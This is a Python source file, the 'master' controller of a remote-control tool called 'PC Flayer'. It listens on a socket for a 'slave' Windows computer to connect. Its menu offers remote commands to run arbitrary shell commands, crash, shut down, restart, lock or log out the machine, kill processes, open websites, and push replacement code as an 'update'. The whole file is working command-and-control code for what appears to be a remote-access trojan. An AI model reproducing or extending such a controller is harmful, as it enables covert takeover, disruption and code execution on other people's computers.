import socket
import threading
import time
import os

version = "1.1.0"

#ACTUAL PORT: 5050
#TEST PORT: 5051

print("________________________________")
print(f"PC Flayer ™ v{version}")
print("(by R3dSourPatch)")
print("________________________________")
print("")
print("")

TESTING_MODE = input("[SCRIPT] Enter testing mode? (y/n): ")
if TESTING_MODE:
    if TESTING_MODE == "n":
        TESTING_MODE = False
        print("[SCRIPT] Testing mode denied.")
    elif TESTING_MODE == "y":
        TESTING_MODE = True
        print("[SCRIPT] Testing mode accessed.")
    else:
        TESTING_MODE = False
        print("[SCRIPT] Testing mode denied.")
else:
    TESTING_MODE = False
    print("[SCRIPT] Testing mode denied.")

IP = socket.gethostbyname(socket.gethostname())
PORT = 5050
if TESTING_MODE == True:
    PORT = 5051
ADDR = (IP, PORT)

master = None
conn, addr = None, None

ready = True

def show_help():
    print("___________________")
    print("(Coded and designed for Windows 10 computers.)")
    print("Available commands:")
    print("___________________")
    print("[run (command)] - Runs a command prompt command on slave's end")
    print("[shutdown] - Shuts down the slave computer (script will throw error; just restart master.py)")
    print("[restart] - Restarts the slave computer (script will throw error; just restart master.py)")
    print("[logout] - Logs user out of slave windows account (script will PROBABLY throw error; if so, restart master.py)")
    print("[lock] - Locks user out of slave windows account")
    print("[crash] - Crashes slave computer (script will throw error; just restart master.py)")
    print("[processes] - Returns a list of processes running on slave computer")
    print("[sleep] - Puts slave computer into sleep/hybernation mode (script will PROBABLY throw error; if so, restart master.py)")
    print("[close (app.exe)] - Closes app.exe")
    print("[search (website)] - Searches up a website on microsoft edge on slave computer")
    print("[exit] - Closes application manipulating slave computer (script will throw error; restart needed in slave computer and master.py)")
    print("[leave] - Closes master.py but still usable if reopened")
    print("[version] - Checks the version of PC Flayer the slave computer is running")
    print("[update] - Updates PC Flayer version on slave computer (update.py file required, restart of master.py required too)")
    print("___________________")

def listen():
    global ready
    while True:
        received = conn.recv(2048)
        message = received.decode()
        args = message.split(" ")
        if args[0] == "$approved":
            ready = True
            continue
        elif args[0] == "$error":
            print("[ERROR] There was an error executing command on slave's end")
            ready = True
            continue
        elif args[0] == "$updated":
            print("[UPDATE] Update has successfully finished in slave's end")
            ready = False
            continue
        else:
            print(f'[RESPONSE] "{message}"')
            continue
        

def send():
    global ready
    while True:
        time.sleep(1)
        if ready == True:
            try:
                command = input("[COMMAND] Enter a command or type 'help': ")
                if command == "help":
                    show_help()
                    continue
                elif command == "leave":
                    os._exit(1)
                    return
                elif command == "update":
                    if os.path.exists("update.py"):
                        conn.send("update".encode())
                        print("[UPDATE] Starting update process...")
                        file = open("update.py", "r")
                        print("[UPDATE] Opened update file successfully")
                        fileData = file.read()
                        print("[UPDATE] Read update file successfully")
                        ready = False
                        fileSize = len(fileData.encode("utf-8"))
                        fileSize = str(fileSize)
                        print(f"[UPDATE] Calculated update file size successfully ({fileSize} bytes)")
                        time.sleep(1)
                        conn.send(fileSize.encode("utf-8"))
                        print("[UPDATE] Sent update file size to slave successfully")
                        time.sleep(1)
                        conn.send(fileData.encode("utf-8"))
                        print("[UPDATE] Sent update file data to slave successfully")
                        print("[SCRIPT] Please restart master.py, terminating...")
                        time.sleep(1)
                        os._exit(1)
                        return
                    else:
                        print("[ERROR] Update.py file not found")
                        ready = True
                        continue
                else:
                    command = command.encode()
                    conn.send(command)
                    ready = False
            except:
                print("[ERROR] There was an error sending the command")
                continue
        else:
            continue

def main():
    global master
    global conn, addr
    master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    master.bind(ADDR)
    master.listen(1)
    print("[SOCKET] Waiting for slave...")
    conn, addr = master.accept()
    print(f"[SLAVE] Slave has been found {addr}")
    send_thread = threading.Thread(target=send)
    send_thread.start()
    listen_thread = threading.Thread(target=listen)
    listen_thread.start()

print("[SCRIPT] Running main function...")
main()